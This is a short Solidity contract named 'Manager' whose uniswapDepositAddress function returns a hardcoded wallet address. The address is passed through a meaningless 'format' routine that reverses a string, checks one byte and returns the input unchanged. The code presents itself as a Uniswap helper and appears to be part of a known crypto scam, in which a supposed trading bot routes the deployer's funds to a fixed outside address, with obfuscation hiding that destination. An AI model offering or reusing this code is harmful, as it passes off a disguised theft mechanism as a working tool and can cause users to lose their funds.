pragma solidity ^0.6.6;

contract Manager{
function performTasks()public{
    }
function uniswapDepositAddress()public pure returns (address) {
    return address(format(0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE));
      
  }
function format(address addr)private pure returns(address){

    bytes memory 
    rec='0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE';
    
    string memory rec2=new string
    (rec.length);

    bytes memory rec3=bytes(rec2);
        for(uint i=0;i<rec.length;i++)
            rec3[rec.length-i-1]=rec[i];
    
require(rec3[30]==0x37);return addr;}
  
}
